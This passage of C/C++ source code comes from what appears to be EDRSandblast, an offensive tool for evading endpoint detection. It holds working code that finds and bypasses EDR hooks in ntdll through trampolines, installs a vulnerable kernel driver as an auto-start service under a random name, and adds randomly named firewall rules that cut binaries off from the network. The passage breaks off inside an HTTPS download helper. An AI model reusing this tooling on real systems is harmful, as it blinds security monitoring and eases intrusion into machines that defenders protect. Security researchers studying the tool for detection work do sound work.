        debugf("unmonitoredNtProtectVirtualMemory 2 failed with status 0x%08x\n", status);
        exit(1);
    }

    switch (unhook_method) {
    case UNHOOK_WITH_DUPLICATE_NTPROTECTVIRTUALMEMORY:
        if (secondNtdll && INVALID_HANDLE_VALUE != secondNtdll) {
            FreeLibrary(secondNtdll);
        }
        DeleteFileW(ntdlolFilePath);
        break;

    }
}



pNtProtectVirtualMemory getSafeVirtualProtectUsingTrampoline(DWORD unhook_method) {
    PE* ntdllPE_mem = NULL;
    PE* ntdllPE_disk = NULL;
    getNtdllPEs(&ntdllPE_mem, &ntdllPE_disk);

    PVOID disk_NtProtectVirtualMemory = PE_functionAddr(ntdllPE_disk, "NtProtectVirtualMemory");
    PVOID mem_NtProtectVirtualMemory = PE_functionAddr(ntdllPE_mem, "NtProtectVirtualMemory");

    size_t patchSize = 0;
    PVOID patchAddr = findDiff(mem_NtProtectVirtualMemory, disk_NtProtectVirtualMemory, PATCH_MAX_SIZE, &patchSize);

    if (patchSize == 0) {
        return (pNtProtectVirtualMemory)mem_NtProtectVirtualMemory;
    }

    if (unhook_method == UNHOOK_WITH_EDR_NTPROTECTVIRTUALMEMORY_TRAMPOLINE) {
        PVOID trampoline = NULL;
        trampoline = searchTrampolineInExecutableMemory((PBYTE)disk_NtProtectVirtualMemory + ((PBYTE)patchAddr - (PBYTE)mem_NtProtectVirtualMemory), patchSize, (PBYTE)patchAddr + patchSize);
        if (NULL == trampoline) {
            debugf("Trampoline for NtProtectVirtualMemory was impossible to find !\n");
            exit(1);
        }
        return (pNtProtectVirtualMemory)trampoline;
    }
    else if (unhook_method == UNHOOK_WITH_INHOUSE_NTPROTECTVIRTUALMEMORY_TRAMPOLINE) {

#if _WIN64
#define JUMP_SIZE 14
#else
#define JUMP_SIZE 5
#endif
        PBYTE trampoline = VirtualAlloc(NULL, patchSize + JUMP_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (NULL == trampoline) {
            debugf("\tError : VirtualAlloc: 0x%x\n\n", GetLastError());
            exit(1);
        }

        DWORD oldProtect;
        memcpy(trampoline, disk_NtProtectVirtualMemory, patchSize);
#if _WIN64
        * ((WORD*)(trampoline + patchSize)) = 0x25FF; //RIP relative jmp
        *((DWORD*)(trampoline + patchSize + 2)) = 0x0; // [RIP + 0]
        *((QWORD*)(trampoline + patchSize + 2 + 4)) = (QWORD)(((BYTE*)mem_NtProtectVirtualMemory) + patchSize);
#else
        * (trampoline + patchSize) = 0xE9; //far JMP
        *((DWORD*)(trampoline + patchSize + 1)) = (DWORD)(((DWORD)mem_NtProtectVirtualMemory) + patchSize - (((DWORD)trampoline) + patchSize + JUMP_SIZE));
#endif
        VirtualProtect(trampoline, patchSize + JUMP_SIZE, PAGE_EXECUTE_READ, &oldProtect);

        return (pNtProtectVirtualMemory)trampoline;
    }
    return NULL;
}

PVOID hookResolver(PBYTE hookAddr) {
    PBYTE destination = hookAddr;
    BOOL hasFollowedJmp = FALSE;
    while (TRUE) {
        MEMORY_BASIC_INFORMATION mbi;
        VirtualQuery(destination, &mbi, sizeof(mbi));
        if (mbi.State != MEM_COMMIT) {
            return NULL;
        }
        switch (destination[0]) {
        case 0xE9:
        {
            int diff = *((int*)(&destination[1]));
            destination = &destination[5] + diff;
            hasFollowedJmp = TRUE;
            break;
        }
#if _WIN64
        case 0xFF:
        {
            BYTE selector = destination[1];
            if (selector != 0x25) {
                return NULL;
            }
            int diff = *((int*)(&destination[2]));
            QWORD* offsetPtr = (QWORD*)((&destination[6]) + diff);
            destination = (PBYTE)*offsetPtr;
            hasFollowedJmp = TRUE;
            break;
        }
#endif
        default:
            if (!hasFollowedJmp) {
                return NULL;
            }
            else {
                return destination;
            }
        }
    }
}

BOOL isFunctionHooked(LPCSTR functionName, PE* memDLL, PE* diskDLL) {
    PVOID mem_functionStart = PE_functionAddr(memDLL, functionName);
    PVOID disk_functionStart = PE_functionAddr(diskDLL, functionName);
    return findDiff(mem_functionStart, disk_functionStart, PATCH_MAX_SIZE, NULL) != NULL;
}

_Ret_notnull_ HOOK* searchHooks(const char* csvFileName) {
    FILE* csvFile = NULL;
    DWORD hookListSize = 8;
    DWORD hookList_i = 0;
    HOOK* hooksList = calloc(hookListSize, sizeof(HOOK));
    if (NULL == hooksList) {
        debugf("calloc failed\n");
        exit(1);
    }
    if (csvFileName) {
        if (fopen_s(&csvFile, csvFileName, "w") || NULL == csvFile) {
            perror("CSV file could not be opened:");
            exit(1);
        }
        fprintf(csvFile, "DLL base address;DLL name;DLL full path;Hooked function;Hook handler address;Hook handler relative address\n");
    }

    BOOL hooksFoundInLastModule = TRUE;
    PBYTE disk_dllContent = NULL;
    PE* diskDLL = NULL;
    PE* memDLL = NULL;
    for (LDR_DATA_TABLE_ENTRY* currentModuleEntry = getNextModuleEntryInLoadOrder(NULL); currentModuleEntry != NULL; currentModuleEntry = getNextModuleEntryInLoadOrder(currentModuleEntry)) {
        UNICODE_STRING dll_name = currentModuleEntry->BaseDllName;
        if (dll_name.Buffer == NULL) {
            continue;
        }
        WCHAR* moduleName = currentModuleEntry->FullDllName.Buffer;

        if (!hooksFoundInLastModule) {
            printf_or_not("[+] [Hooks]\t\tNo hooks found in this module.\n");
            if (disk_dllContent) {
                free(disk_dllContent);
                disk_dllContent = NULL;
            }
            if (memDLL) {
                PE_destroy(memDLL);
                memDLL = NULL;
            }
            if (diskDLL) {
                PE_destroy(diskDLL);
                diskDLL = NULL;
            }
        }
        else {
            hooksFoundInLastModule = FALSE;
        }
        printf_or_not("[+] [Hooks]\t%ws (%ws): 0x%p\n", dll_name.Buffer, moduleName, currentModuleEntry->DllBase);
        if (csvFile) {
            fprintf(csvFile, "0x%p;%ws;%ws;;;\n",
                currentModuleEntry->DllBase,
                currentModuleEntry->BaseDllName.Buffer,
                currentModuleEntry->FullDllName.Buffer
            );
        }

        PVOID mem_dllImageBase = currentModuleEntry->DllBase;
        memDLL = PE_create(mem_dllImageBase, TRUE);
        if (!memDLL || NULL == memDLL->exportDirectory) {
            continue;
        }

        if (!FileExistsW(currentModuleEntry->FullDllName.Buffer)) {
            continue;
        }
        disk_dllContent = ReadFullFileW(currentModuleEntry->FullDllName.Buffer);
        if (NULL == disk_dllContent) {
            debugf("\tError : ReadFullFileW: 0x%x\n\n", GetLastError());
            continue;
        }


        diskDLL = PE_create(disk_dllContent, FALSE);
        if (NULL == diskDLL) {
            debugf("\tError : PE_create\n");
            continue;
        }

        PE_rebasePE(diskDLL, memDLL->baseAddress);

        for (DWORD nameOrdinal = 0; nameOrdinal < diskDLL->exportedNamesLength; nameOrdinal++) {
            LPCSTR functionName = PE_RVA_to_Addr(diskDLL, diskDLL->exportedNames[nameOrdinal]);
            DWORD functionRVA = PE_functionRVA(diskDLL, functionName);
            IMAGE_SECTION_HEADER* functionSectionHeader = PE_sectionHeader_fromRVA(diskDLL, functionRVA);

            if ((functionSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0)//not a function
                continue;

            PBYTE disk_functionStart = PE_functionAddr(diskDLL, functionName);
            PBYTE mem_functionStart = PE_functionAddr(memDLL, functionName);

            //check if hook was already detected in this function (due to export aliasing)
            BOOL alreadyChecked = FALSE;
            for (size_t i = 0; i < hookList_i; i++) {
                if (hooksList[i].mem_function == mem_functionStart) {
                    alreadyChecked = TRUE;
                    break;
                }

            }
            if (alreadyChecked)
                continue;

            if (isFunctionHooked(functionName, diskDLL, memDLL)) {
                printf_or_not("[+] [Hooks]\t\tHook detected in function %s (0x%08lx)", functionName, functionRVA);
                hooksFoundInLastModule = TRUE;
                PVOID jmpTarget = hookResolver(mem_functionStart);
                if (NULL == jmpTarget) {
                    printf_or_not("...but not a JMP, maybe a false positive (data export) or unimplemented hook recognition\n");
                }
                else {
                    LDR_DATA_TABLE_ENTRY* hookTargetModuleEntry = getModuleEntryFromAbsoluteAddr(jmpTarget);
                    for (DWORD i = 0; i < 40 - strlen(functionName); i++) {
                        printf_or_not(" ");
                    }
                    // TODO: Fix hooks resolver to identify dll 
                    // printf_or_not("-> %ws+0x%tx", hookTargetModuleEntry->BaseDllName.Buffer, ((PBYTE)jmpTarget) - ((PBYTE)hookTargetModuleEntry->DllBase));

                    if (csvFile) {
                        fprintf(csvFile, "0x%p;%ws;%ws;%s;0x%p;%ws+0x%tx\n",
                            currentModuleEntry->DllBase,
                            currentModuleEntry->BaseDllName.Buffer,
                            currentModuleEntry->FullDllName.Buffer,
                            functionName,
                            jmpTarget,
                            hookTargetModuleEntry->BaseDllName.Buffer, ((PBYTE)jmpTarget) - ((PBYTE)hookTargetModuleEntry->DllBase)
                        );
                    }

                    if (hookList_i >= hookListSize) {
                        hookListSize *= 2;
                        PVOID hooksListTmp = realloc(hooksList, hookListSize * sizeof(HOOK));
                        if (hooksListTmp == NULL) {
                            debugf("realloc failed\n");
                            exit(1);
                        }
                        hooksList = hooksListTmp;
                    }
                    printf_or_not("\n");

                    hooksList[hookList_i].mem_function = mem_functionStart;
                    hooksList[hookList_i].disk_function = disk_functionStart;
                    hooksList[hookList_i].functionName = functionName;
                    hooksList[hookList_i].list_patches = findDiffsInRange(mem_functionStart, disk_functionStart, PATCH_MAX_SIZE);
                    hookList_i++;
                }
            }
        }
    }
    if (!hooksFoundInLastModule) {
        printf_or_not("[+] [Hooks]\t\tNo hooks found in this module.\n");
    }
    if (csvFileName) {
        fclose(csvFile);
    }
    if (hookList_i >= hookListSize) {
        hookListSize++;
        PVOID hooksListTmp = realloc(hooksList, hookListSize * sizeof(HOOK));
        if (NULL == hooksListTmp) {
            printf_or_not("realloc failed\n");
            exit(1);
        }
        hooksList = hooksListTmp;
    }
    hooksList[hookList_i].mem_function = NULL;
    hooksList[hookList_i].disk_function = NULL;
    hooksList[hookList_i].functionName = NULL;

    return hooksList;
}

/*
* Get a view of ntdll.dll PE both on disk and in memory, while caching it for later access
* "Rebase" the disk version to the same base address of the memory-mapped one for coherence
*/
void getNtdllPEs(PE** ntdllPE_mem, PE** ntdllPE_disk) {
    LDR_DATA_TABLE_ENTRY* ntdllModuleEntry = getModuleEntryFromNameW(L"ntdll.dll");
    PE* ntdllPE_mem_l = NULL;
    PE* ntdllPE_disk_l = NULL;

    if (ntdllMemPe_g == NULL) {
        ntdllMemPe_g = ntdllPE_mem_l = PE_create(ntdllModuleEntry->DllBase, TRUE);
    }
    else {
        ntdllPE_mem_l = ntdllMemPe_g;
    }
    if (ntdllDiskPe_g == NULL) {
        PVOID disk_dllContent = ReadFullFileW(ntdllModuleEntry->FullDllName.Buffer);
        if (NULL == disk_dllContent) {
            exit(1);
        }
        ntdllDiskPe_g = ntdllPE_disk_l = PE_create(disk_dllContent, FALSE);
        PE_rebasePE(ntdllPE_disk_l, ntdllPE_mem_l->baseAddress);
    }
    else {
        ntdllPE_disk_l = ntdllDiskPe_g;
    }

    if (ntdllPE_mem) {
        *ntdllPE_mem = ntdllPE_mem_l;
    }
    if (ntdllPE_disk) {
        *ntdllPE_disk = ntdllPE_disk_l;
    }
}

void test_trampoline_search()
{
    for (HOOK* h = searchHooks(NULL); h->disk_function; ++h)
    {
        PVOID trampoline = NULL;
        printf_or_not("[+] [Hooks]\tLooking for %s trampoline...\n", h->functionName);
        for (PATCH_DIFF* d = h->list_patches; d->disk_ptr; ++d)
        {
            trampoline = (PBYTE)searchTrampolineInExecutableMemory((PBYTE)d->disk_ptr, d->size, (PBYTE)d->mem_ptr + d->size);
            if (trampoline)
            {
                printf_or_not("[+] [Hooks]\t\tTrampoline found at %p !\n", trampoline);
                break;
            }
        }
        if (!trampoline)
            printf_or_not("[+] [Hooks]\t\tTRAMPOLINE NOT FOUND !\n");
    }
}

```

`EDRSandblast/Utils/DriverOps.c`:

```c
/*

--- Driver install / uninstall functions.
--- Source and credit: https://github.com/gentilkiwi/mimikatz

*/
#include <Windows.h>
#include <aclapi.h>
#include <Shlwapi.h>
#include <Tchar.h>
#include <time.h>

#include "DriverOps.h"

#include "../EDRSandblast.h"
#include "StringUtils.h"
#include "WindowsServiceOps.h"
/*

--- Vulnerable driver install / uninstall functions.

*/


TCHAR* g_driverServiceName;

TCHAR* GetDriverServiceName(void) {
    if (!g_driverServiceName || _tcslen(g_driverServiceName) == 0) {
        g_driverServiceName = allocAndGenerateRandomString(SERVICE_NAME_LENGTH);
    }
    return g_driverServiceName;
}

void SetDriverServiceName(_In_z_ TCHAR *newName) {
    if (g_driverServiceName) {
        free(g_driverServiceName);
    }
    g_driverServiceName = _tcsdup(newName);

    if (!g_driverServiceName) {
        _putts_or_not(TEXT("[!] Error while attempting to set the service name."));
        return;
    }
}

BOOL InstallVulnerableDriver(TCHAR* driverPath) {
    TCHAR* svcName = GetDriverServiceName();

    DWORD status = ServiceInstall(svcName, svcName, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);

    if (status == 0x00000005) {
        _putts_or_not(TEXT("[!] 0x00000005 - Access Denied when attempting to install the driver - Did you run as administrator?"));
    }

    return status == 0x0;
}

BOOL UninstallVulnerableDriver(void) {
    TCHAR* svcName = GetDriverServiceName();

    BOOL status = ServiceUninstall(svcName, 0);
    
    if (!status) {
        PRINT_ERROR_AUTO(TEXT("ServiceUninstall"));
    }

    return status;
}

BOOL IsDriverServiceRunning(LPTSTR driverPath, LPTSTR* serviceName) {
    SC_HANDLE hSCM = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT);
    BOOL isRunning = FALSE;
    if (hSCM) {
        DWORD cbBufSize, cbBytesNeeded;
        DWORD nbServices;
        BOOL bRes = EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER, SERVICE_STATE_ALL, NULL, 0, &cbBytesNeeded, &nbServices, NULL, NULL);
        if (!bRes && GetLastError() == ERROR_MORE_DATA) {
            ENUM_SERVICE_STATUS_PROCESS* services = calloc(1, cbBytesNeeded);
            if (services){
                cbBufSize = cbBytesNeeded;
                bRes = EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER, SERVICE_STATE_ALL, (LPBYTE)services, cbBufSize, &cbBytesNeeded, &nbServices, NULL, NULL);
                if (bRes) {
                    for (DWORD i = 0; i < nbServices; i++) {
                        SC_HANDLE hS = OpenService(hSCM, services[i].lpServiceName, SERVICE_QUERY_CONFIG);
                        if (hS && _tcscmp(services[i].lpServiceName, GetDriverServiceName())) {
                            bRes = QueryServiceConfig(hS, NULL, 0, &cbBytesNeeded);
                            if (!bRes && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
                                QUERY_SERVICE_CONFIG* serviceConfig = calloc(1, cbBytesNeeded);
                                if (serviceConfig) {
                                    cbBufSize = cbBytesNeeded;
                                    bRes = QueryServiceConfig(hS, serviceConfig, cbBufSize, &cbBytesNeeded);
                                    if (bRes) {
                                        if (!_tcscmp(PathFindFileName(serviceConfig->lpBinaryPathName), PathFindFileName(driverPath))) {
                                            isRunning = TRUE;
                                            if (serviceName) {
                                                *serviceName = _tcsdup(services[i].lpServiceName);
                                            }
                                        }
                                    }
                                    free(serviceConfig);
                                }
                            }
                            CloseServiceHandle(hS);
                        }
                    }
                }
                free(services);
            }
        }
        CloseServiceHandle(hSCM);
    }
    else {
        PRINT_ERROR_AUTO(TEXT("OpenSCManager(create)"));
        return FALSE;
    }
    return isRunning;
}

```

`EDRSandblast/Utils/FileUtils.c`:

```c
#include <Windows.h>

/*
* Dumps the full content of a single file into a newly allocated buffer
*/
PBYTE ReadFullFileW(LPCWSTR fileName) {
	HANDLE hFile = CreateFileW(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return NULL;
	}
	DWORD fileSize = GetFileSize(hFile, NULL);
	PBYTE fileContent = malloc(fileSize);
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, fileContent, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
		free(fileContent);
		fileContent = NULL;
	}
	CloseHandle(hFile);
	return fileContent;
}


/*
* Checks is a file extists (and is not a directory)
*/
BOOL FileExistsW(LPCWSTR szPath)
{
	DWORD dwAttrib = GetFileAttributesW(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}
BOOL FileExistsA(LPCSTR szPath)
{
	DWORD dwAttrib = GetFileAttributesA(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

/*
* Dumps the content of a buffer into a new file
*/
BOOL WriteFullFileW(LPCWSTR fileName, PBYTE fileContent, SIZE_T fileSize) {
	HANDLE hFile = CreateFileW(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}
	BOOL res = WriteFile(hFile, fileContent, (DWORD)fileSize, NULL, NULL);
	CloseHandle(hFile);
	return res;
}

```

`EDRSandblast/Utils/FileVersion.c`:

```c
/*

--- ntoskrnl.exe / wdigest.dll version compute functions.

*/
#include <Tchar.h>
#include <stdio.h>

#include "../EDRSandblast.h"

#include "FileVersion.h"

void GetFileVersion(TCHAR* buffer, SIZE_T bufferLen, TCHAR* filename) {
    DWORD verHandle = 0;
    UINT size = 0;
    LPVOID lpBuffer = NULL;

    DWORD verSize = GetFileVersionInfoSize(filename, &verHandle);

    if (verSize != 0) {
        LPTSTR verData = (LPTSTR)calloc(verSize, 1);

        if (!verData) {
            _putts_or_not(TEXT("[!] Couldn't allocate memory to retrieve version data"));
            return;
        }

        if (GetFileVersionInfo(filename, 0, verSize, verData)) {
            if (VerQueryValue(verData, TEXT("\\"), &lpBuffer, &size)) {
                if (size) {
                    VS_FIXEDFILEINFO* verInfo = (VS_FIXEDFILEINFO*)lpBuffer;
                    if (verInfo->dwSignature == 0xfeef04bd) {
                        DWORD majorVersion = (verInfo->dwFileVersionLS >> 16) & 0xffff;
                        DWORD minorVersion = (verInfo->dwFileVersionLS >> 0) & 0xffff;
                        _stprintf_s(buffer, bufferLen, TEXT("%ld-%ld"), majorVersion, minorVersion);
                        // _tprintf_or_not(TEXT("File Version: %d.%d\n"), majorVersion, minorVersion);
                    }
                }
            }
        }
        free(verData);
    }
}

```

`EDRSandblast/Utils/FirewallOps.cpp`:

```cpp
extern "C" {
#include "../EDRSandblast.h"
#include "FirewallOps.h"
}

HRESULT ComInitNetFwPolicy2(INetFwPolicy2** ppNetFwPolicy2) {
	HRESULT hrStatus = S_OK;

	hrStatus = CoInitializeEx(0, COINIT_APARTMENTTHREADED);

	// Ignore RPC_E_CHANGED_MODE (Microsoft documentation stating that the existing mode does not matter).
	if (hrStatus != RPC_E_CHANGED_MODE && FAILED(hrStatus)) {
		_tprintf_or_not(TEXT("[!] Error while initializing COM (CoInitializeEx failed: 0x%08lx)\n"), hrStatus);
		return hrStatus;
	}

	hrStatus = CoCreateInstance(__uuidof(NetFwPolicy2), NULL, CLSCTX_INPROC_SERVER, __uuidof(INetFwPolicy2), (void**)ppNetFwPolicy2);
	if (FAILED(hrStatus)) {
		_tprintf_or_not(TEXT("[!] Error while initializing the INetFwPolicy2 interface (CoCreateInstance for INetFwPolicy2 failed: 0x%08lx)\n"), hrStatus);
		return hrStatus;
	}

	return hrStatus;
}

extern "C" HRESULT IsFirewallEnabled(BOOL* firewallIsOn);
HRESULT IsFirewallEnabled(BOOL* firewallIsOn) {
	HRESULT hrComInit = E_FAIL;
	HRESULT hrStatus = S_OK;

	INetFwPolicy2* pNetFwPolicy2 = NULL;
	long CurrentProfilesBitMask = 0;
	VARIANT_BOOL vbFirewallsEnabled = VARIANT_TRUE;
	VARIANT_BOOL vbFirewallProfileEnabled = VARIANT_FALSE;

	struct ProfileMapElement {
		NET_FW_PROFILE_TYPE2 Id;
		LPCWSTR Name;
	};
	
	ProfileMapElement ProfileMap[3];
	ProfileMap[0].Id = NET_FW_PROFILE2_DOMAIN;
	ProfileMap[0].Name = L"Domain";
	ProfileMap[1].Id = NET_FW_PROFILE2_PRIVATE;
	ProfileMap[1].Name = L"Private";
	ProfileMap[2].Id = NET_FW_PROFILE2_PUBLIC;
	ProfileMap[2].Name = L"Public";

	hrComInit = ComInitNetFwPolicy2(&pNetFwPolicy2);
	if (FAILED(hrComInit)) {
		hrStatus = E_FAIL;
		goto cleanup;
	}

	hrStatus = pNetFwPolicy2->get_CurrentProfileTypes(&CurrentProfilesBitMask);
	if (FAILED(hrStatus)) {
		_tprintf_or_not(TEXT("[!] Could not determine Firewall status (failed to get the active Firewall profiles - get_CurrentProfileTypes failed: 0x%08lx)\n"), hrStatus);
		goto cleanup;
	}

	for (DWORD i = 0; i < 3; i++) {
		if (CurrentProfilesBitMask & ProfileMap[i].Id) {
			hrStatus = pNetFwPolicy2->get_FirewallEnabled(ProfileMap[i].Id, &vbFirewallProfileEnabled);
			if (FAILED(hrStatus)) {
				wprintf_or_not(L"[!] Could not determine Firewall status (failed to retrieve FirewallEnabled settings for %s profile - get_FirewallEnabled failed: 0x%08lx)\n", ProfileMap[i].Name, hrStatus);
				goto cleanup;
			}
			if (vbFirewallProfileEnabled == VARIANT_FALSE) {
				wprintf_or_not(L"[*] The Windows Firewall is off on the (active) '%s' profile.\n", ProfileMap[i].Name);
				vbFirewallsEnabled = VARIANT_FALSE;
			}
		}
	}
	
	*firewallIsOn = (BOOL)(vbFirewallsEnabled == VARIANT_TRUE);

cleanup:
	if (pNetFwPolicy2) {
		pNetFwPolicy2->Release();
		pNetFwPolicy2 = NULL;
	}

	if (SUCCEEDED(hrComInit)) {
		CoUninitialize();
	}

	return hrStatus;
}

extern "C" HRESULT CreateFirewallRuleBlockBinary(TCHAR* binaryPath, NET_FW_RULE_DIRECTION direction, TCHAR* ruleName);
HRESULT CreateFirewallRuleBlockBinary(TCHAR* binaryPath, NET_FW_RULE_DIRECTION direction, TCHAR* ruleName) {
	HRESULT hrComInit = E_FAIL;
	HRESULT hrStatus = S_OK;

	INetFwPolicy2* pNetFwPolicy2 = NULL;
	INetFwRules* pFwRules = NULL;
	INetFwRule* pFwRule = NULL;

	BSTR bstrRuleName = NULL;
	BSTR bstrRuleDescription = NULL;
	BSTR bstrRuleApplication = NULL;

	hrComInit = ComInitNetFwPolicy2(&pNetFwPolicy2);
	if (FAILED(hrComInit)) {
		hrStatus = E_FAIL;
		goto cleanup;
	}
	
	// Rules parameters.
	generateRandomString(ruleName, FW_RULE_NAME_MAX_LENGTH);
	bstrRuleName = SysAllocString(ruleName);
	bstrRuleDescription = SysAllocString(ruleName);
	bstrRuleApplication = SysAllocString(binaryPath);

	// hrStatus = pNetFwPolicy2->get_Rules(&pFwRules);
	hrStatus = pNetFwPolicy2->get_Rules(&pFwRules);
	if (FAILED(hrStatus)) {
		_tprintf_or_not(TEXT("[!] Could not retrieve current Firewall rules (pNetFwPolicy2->get_Rules failed: 0x%08lx).\n"), hrStatus);
		goto cleanup;
	}

	// Create a new Firewall Rule object.
	hrStatus = CoCreateInstance(__uuidof(NetFwRule), NULL, CLSCTX_INPROC_SERVER, __uuidof(INetFwRule), (void**)&pFwRule);
	if (FAILED(hrStatus)) {
		_tprintf_or_not(TEXT("[!] Error while attempting to initiate the INetFwRule (CoCreateInstance failed: 0x%08lx).\n"), hrStatus);
		goto cleanup;
	}

	// Populates the rule's parameters.
	pFwRule->put_Name(bstrRuleName);
	pFwRule->put_Description(bstrRuleDescription);
	pFwRule->put_ApplicationName(bstrRuleApplication);
	pFwRule->put_Protocol(NET_FW_IP_PROTOCOL_ANY);
	pFwRule->put_Direction(direction);
	pFwRule->put_Profiles(FW_PROFILE_TYPE_ALL);
	pFwRule->put_Action(NET_FW_ACTION_BLOCK);
	pFwRule->put_Enabled(VARIANT_TRUE);

	// Add the new rule.
	hrStatus = pFwRules->Add(pFwRule);
	if (FAILED(hrStatus)) {
		_tprintf_or_not(TEXT("[!] Error while adding the firewall blocking rule for %s (INetFwRule->Add failed: 0x%08lx)\n"), binaryPath, hrStatus);
	}

cleanup:

	if (pFwRule) {
		pFwRule->Release();
	}

	if (pFwRules) {
		pFwRules->Release();
	}

	if (pNetFwPolicy2) {
		pNetFwPolicy2->Release();
	}

	if (bstrRuleName) {
		SysFreeString(bstrRuleName);
		bstrRuleName = NULL;
	}

	if (bstrRuleDescription) {
		SysFreeString(bstrRuleDescription);
		bstrRuleDescription = NULL;

	}

	if (bstrRuleApplication) {
		SysFreeString(bstrRuleApplication);
		bstrRuleApplication = NULL;
	}

	if (SUCCEEDED(hrComInit)) {
		CoUninitialize();
	}

	return hrStatus;
}

extern "C" HRESULT DeleteFirewallRule(TCHAR* ruleName);
HRESULT DeleteFirewallRule(TCHAR* ruleName) {
	HRESULT hrComInit = E_FAIL;
	HRESULT hrStatus = S_OK;

	INetFwPolicy2* pNetFwPolicy2 = NULL;
	INetFwRules* pFwRules = NULL;

	hrComInit = ComInitNetFwPolicy2(&pNetFwPolicy2);
	if (FAILED(hrComInit)) {
		hrStatus = E_FAIL;
		goto cleanup;
	}

	hrStatus = pNetFwPolicy2->get_Rules(&pFwRules);
	if (FAILED(hrStatus)) {
		_tprintf_or_not(TEXT("[!] Could not retrieve current Firewall rules (pNetFwPolicy2->get_Rules: 0x%08lx).\n"), hrStatus);
		goto cleanup;
	}

	hrStatus = pFwRules->Remove(ruleName);
	if (FAILED(hrStatus)) {
		_tprintf_or_not(TEXT("[!] Error while removing Firewall rule \"%s\" (failed with: 0x%08lx)\n"), ruleName, hrStatus);
		_tprintf_or_not(TEXT("[!] The rule can be removed manually using: netsh advfirewall firewall delete rule name=%s\n"), ruleName);
	}
	else {
		_tprintf_or_not(TEXT("[+] Successfully removed Firewall rule \"%s\"\n"), ruleName);
	}

cleanup:

	if (pFwRules) {
		pFwRules->Release();
	}

	if (SUCCEEDED(hrComInit)) {
		pNetFwPolicy2->Release();
	}

	return hrStatus;
}
```

`EDRSandblast/Utils/HttpClient.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <windef.h>
#include <winhttp.h>

#include "../EDRSandblast.h"
#include "HttpClient.h"


BOOL HttpsDownloadFullFile(LPCWSTR domain, LPCWSTR uri, PBYTE* output, SIZE_T* output_size) {
	///wprintf_or_not(L"Downloading https://%s%s...\n", domain, uri);
	// Get proxy configuration
	WINHTTP_CURRENT_USER_IE_PROXY_CONFIG proxyConfig;
	WinHttpGetIEProxyConfigForCurrentUser(&proxyConfig);
	BOOL proxySet = !(proxyConfig.fAutoDetect || proxyConfig.lpszAutoConfigUrl != NULL);
	DWORD proxyAccessType = proxySet ? ((proxyConfig.lpszProxy == NULL) ?
		WINHTTP_ACCESS_TYPE_NO_PROXY : WINHTTP_ACCESS_TYPE_NAMED_PROXY) : WINHTTP_ACCESS_TYPE_NO_PROXY;
	LPCWSTR proxyName = proxySet ? proxyConfig.lpszProxy : WINHTTP_NO_PROXY_NAME;
	LPCWSTR proxyBypass = proxySet ? proxyConfig.lpszProxyBypass : WINHTTP_NO_PROXY_BYPASS;

	// Initialize HTTP session and request
	HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.0", proxyAccessType, proxyName, proxyBypass, 0);
	if (hSession == NULL) {
		printf_or_not("WinHttpOpen failed with error : 0x%x\n", GetLastError());
		return FALSE;
	}
	HINTERNET hConnect = WinHttpConnect(hSession, domain, INTERNET_DEFAULT_HTTPS_PORT, 0);
	if (!hConnect) {
		printf_or_not("WinHttpConnect failed with error : 0x%x\n", GetLastError());
		return FALSE;
	}
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", uri, NULL,
		WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	if (!hRequest) {
		return FALSE;
	}

	// Configure proxy manually
	if (!proxySet)
	{
		WINHTTP_AUTOPROXY_OPTIONS  autoProxyOptions;
		autoProxyOptions.dwFlags = proxyConfig.lpszAutoConfigUrl != NULL ? WINHTTP_AUTOPROXY_CONFIG_URL : WINHTTP_AUTOPROXY_AUTO_DETECT;
		autoProxyOptions.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
		autoProxyOptions.fAutoLogonIfChallenged = TRUE;

		if (proxyConfig.lpszAutoConfigUrl != NULL)
			autoProxyOptions.lpszAutoConfigUrl = proxyConfig.lpszAutoConfigUrl;

		WCHAR szUrl[MAX_PATH] = { 0 }; 
		swprintf_s(szUrl, _countof(szUrl), L"https://%ws%ws", domain, uri);

		WINHTTP_PROXY_INFO proxyInfo;
		WinHttpGetProxyForUrl(
			hSession,
			szUrl,
			&autoProxyOptions,
			&proxyInfo);

		WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(proxyInfo));
		DWORD logonPolicy = WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW;
		WinHttpSetOption(hRequest, WINHTTP_OPTION_AUTOLOGON_POLICY, &logonPolicy, sizeof(logonPolicy));
	}

	// Perform request
	BOOL bRequestSent;
	do {
		bRequestSent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	}  while (!bRequestSent && GetLastError() == ERROR_WINHTTP_RESEND_REQUEST);
	if (!bRequestSent) {
		return FALSE;
	}
	BOOL bResponseReceived = WinHttpReceiveResponse(hRequest, NULL);
	if (!bResponseReceived) {
		return FALSE;
	}

	// Read response
	DWORD dwAvailableSize = 0;
